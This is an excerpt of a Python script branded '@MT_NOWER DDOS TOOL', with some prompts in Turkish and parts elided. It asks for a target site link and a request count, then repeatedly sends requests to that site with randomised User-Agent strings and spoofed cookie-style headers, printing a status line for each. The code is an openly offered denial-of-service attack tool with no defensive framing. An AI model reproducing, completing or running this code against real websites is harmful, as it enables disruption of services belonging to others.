...
output = render('NOWER', colors=['red'], align='center')
print(output)
print('@MT_NOWER DDOS TOOL\n',Yellow)
...
falah = input(end_banner_color+ 'Site Link : ')
iz = int(input(red_color+"Kaç Tane ? : "))
print(end_banner_color +'')
def tik():
 for i in range(iz+0): 
  user = random.choice(user_agents)
  print(Yellow+'User-Agent | ',user)
  print('------------------------------')
  url = ""+falah+""
  headers = {
  ...
  'tk_or':'%22%22;',
  'tk_lr':'%22%22;', 
  'tk_ai':'V8Ir5yAnGvLXtiwyuGj%2B8bZV',
  'tk_r3d':'%22%22;',
  'tk_qs':'='
    }
  ...
  if html_page.status_code == 200:
   count = html_page.status_code
   print(green_color+"{} | {}".format(count,end_banner_color+''+ str(falah))+Yellow+" |  ok  ")

  else:
   print (red_color+'Program Finished ')
